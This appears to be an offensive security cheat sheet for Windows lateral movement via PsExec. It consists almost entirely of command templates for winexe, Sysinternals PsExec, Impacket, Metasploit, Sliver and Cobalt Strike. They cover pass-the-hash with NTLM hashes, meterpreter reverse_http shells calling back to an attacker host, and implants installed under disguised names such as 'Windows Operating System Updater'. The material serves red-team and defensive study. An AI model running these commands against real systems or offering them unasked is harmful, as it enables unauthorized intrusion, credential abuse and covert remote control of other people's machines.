# PsExec

## 01 - Unix Shell

`$ winexe -U <domain>/<username>%<password> //<IP> <cmd.exe | powershell.exe>`

- Pass the Hash

`$ pth-winexe -U <domain>/<username>%<ntlm_hash> //<IP> <cmd.exe | powershell.exe>`

## 02 - Sysinternal

- Using part of the Windows Sysinternals PsExec

```
C:\> PsExec64.exe \\<IP> -u <domain_name>\<username> -p <password> -nobanner -r "A legit service name" cmd.exe

C:\> PsExec64.exe \\<IP> -u <domain_name>\<username> -p <password> -nobanner -r "A legit service name" -d -c "C:\path\to\shell.exe"

C:\> PsExec64.exe \\<IP> -u <domain_name>\<username> -p <password> -nobanner -d -c "C:\path\to\shell.exe"
```

## 03 - Impacket

- Authenticate via impacket script with psexec

`$ psexec.py <username>:<password>@<IP> -codecs <codec>`

- Pass the Hash

```
$ psexec.py <username>@<IP> -hashes <LM>:<NT>

$ psexec.py <domain_name>/<username>@<IP> -hashes 0000000000000000000000000000000:<NT>

$ psexec.py <domain_name>/<username>@<IP> -hashes aad3b435b51404eeaa3b435b51404ee:<NT>

$ psexec.py <domain_name>/<username>@<IP> -hashes :<NT>
```

## 04 - Metasploit

### 4.1 - PsExec

#### 4.1.1 - Spawn Callback Shell

```
msf > use exploit/windows/smb/psexec

msf exploit(windows/smb/psexec) > set target 1

msf exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/reverse_http

msf exploit(windows/smb/psexec) > options

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   RHOSTS                                 yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT                 445              yes       The SMB service port (TCP)
   SERVICE_DESCRIPTION                    no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SMBDomain             .                no        The Windows domain to use for authentication
   SMBPass                                no        The password for the specified username
   SMBSHARE                               no        The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBUser                                no        The username to authenticate as


Payload options (windows/x64/meterpreter/reverse_http):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The local listener hostname
   LPORT     4444             yes       The local listener port
   LURI                       no        The HTTP Path


Exploit target:

   Id  Name
   --  ----
   1   PowerShell


msf exploit(windows/smb/psexec) > set lhost <attacker_IP>

msf exploit(windows/smb/psexec) > set lport <attacker_PORT>

msf exploit(windows/smb/psexec) > set rhosts <target_IP>

msf exploit(windows/smb/psexec) > set rport <target_PORT>

msf exploit(windows/smb/psexec) > set smbuser <username>

msf exploit(windows/smb/psexec) > set smbpass <password | nt_hash>

msf exploit(windows/smb/psexec) > set smbdomain <domain>

msf exploit(windows/smb/psexec) > set smbshare <share_name>

msf exploit(windows/smb/psexec) > run
```

TODO: Check what this module does

```
msf > use exploit/windows/local/current_user_psexec

msf exploit(windows/local/current_user_psexec) > set rhosts <IP>
```

#### 4.1.2 - Execute Commands

```
msf exploit(windows/smb/psexec) > set target 4

msf exploit(windows/smb/psexec) > set payload cmd/windows/generic

msf exploit(windows/smb/psexec) > options

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   RHOSTS                                 yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT                 445              yes       The SMB service port (TCP)
   SERVICE_DESCRIPTION                    no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SMBDomain             .                no        The Windows domain to use for authentication
   SMBPass                                no        The password for the specified username
   SMBSHARE                               no        The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBUser                                no        The username to authenticate as


Payload options (cmd/windows/generic):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------
   CMD                    yes       The command string to execute


Exploit target:

   Id  Name
   --  ----
   4   Command


msf exploit(windows/smb/psexec) > set cmd ipconfig /all

msf exploit(windows/smb/psexec) > set rhosts <target_IP>

msf exploit(windows/smb/psexec) > set rport <target_PORT>

msf exploit(windows/smb/psexec) > set smbuser <username>

msf exploit(windows/smb/psexec) > set smbpass <password | nt_hash>

msf exploit(windows/smb/psexec) > set smbdomain <domain>

msf exploit(windows/smb/psexec) > set smbshare <share_name>

msf exploit(windows/smb/psexec) > run
```

### 4.2 - WebExec

```
msf > use exploit/windows/smb/webexec

msf exploit(windows/smb/webexec) > set payload windows/x64/meterpreter/reverse_http

msf exploit(windows/smb/webexec) > options

Module options (exploit/windows/smb/webexec):

   Name          Current Setting   Required  Description
   ----          ---------------   --------  -----------
   RHOSTS                          yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT         445               yes       The SMB service port (TCP)
   SERVICE_NAME  WebExService      no        The service name
   SMBDomain     .                 no        The Windows domain to use for authentication
   SMBPass                         no        The password for the specified username
   SMBUser                         no        The username to authenticate as
   SRVHOST       0.0.0.0           yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT       8080              yes       The local port to listen on.
   SSLCert                         no        Path to a custom SSL certificate (default is randomly generated)
   TMPDIR        c:\Windows\Temp\  yes       The directory to stage our payload in
   URIPATH                         no        The URI to use for this exploit (default is random)


Payload options (windows/x64/meterpreter/reverse_http):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The local listener hostname
   LPORT     4444             yes       The local listener port
   LURI                       no        The HTTP Path


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf exploit(windows/smb/webexec) > set lhost <attacker_IP>

msf exploit(windows/smb/webexec) > set lport <attacker_PORT>

msf exploit(windows/smb/webexec) > set service_name <service_name>

msf exploit(windows/smb/webexec) > set tmpdir C:\path\to\directory\

msf exploit(windows/smb/webexec) > set rhosts <target_IP>

msf exploit(windows/smb/webexec) > set rport <target_PORT>

msf exploit(windows/smb/webexec) > set smbuser <username>

msf exploit(windows/smb/webexec) > set smbpass <password | nt_hash>

msf exploit(windows/smb/webexec) > set smbdomain <domain>

msf exploit(windows/smb/webexec) > set smbshare <share_name>

msf exploit(windows/smb/webexec) > run
```

## 05 - Sliver

### 5.1 - HTTP

```
sliver (IMPLANT_NAME) > profiles new -l -b http://<IP>:<PORT> -a x64 -o windows -f service SVCShell

sliver (IMPLANT_NAME) > psexec -d "Windows Operating System Updater" -s "WindowsUpdateSVC" -p SVCShell <target_IP>
```

### 5.2 - SMB

```
sliver (IMPLANT_NAME) > pivots named-pipe -b <name_pipe>

sliver (IMPLANT_NAME) > profiles new -p namedpiped://<compromised_IP>/./pipe/<name_pipe> -l -a x64 -o windows -f service smb-win-svc64

sliver (IMPLANT_NAME) > psexec -d "Windows Operating System Updater" -s "WindowsUpdateSVC" -p smb-win-svc64 <target_IP>
```

## 06 - Havoc

TODO: Demonstrate commands using PsExec with Havoc

## 07 - Cobalt Strike

### 7.1 - Jump

```
beacon> make_token <domain_name>\<username> <password>

beacon> pth <domain_name>\<username> <password>

beacon> jump <psexec | psexec_psh | psexec64> <listener> <IP>
```

### 7.2 - Remote-Exec

```
beacon> make_token <domain_name>\<username> <password>

beacon> pth <domain_name>\<username> <password>

beacon> remote-exec psexec <IP> C:\path\to\shellsvc.exe

beacon> link \\<IP>
```

## References

- [Popping Remote Shells with Winexe & PTH-Winexe on Windows](https://infinitelogins.com/2020/09/05/popping-remote-shells-pth-winexe-on-windows/)

- [Abusing Windows Admin Shares (Lateral Movement)](https://www.youtube.com/watch?v=41MUhlHGZ4E)

- [Pass the Hash is Dead Long Live Pass the Hash](https://blog.harmj0y.net/penetesting/pass-the-hash-is-dead-long-live-pass-the-hash/)

- [Lateral Movement Windows and Active Directory](https://riccardoancarani.github.io/2019-10-04-lateral-movement-megaprimer/)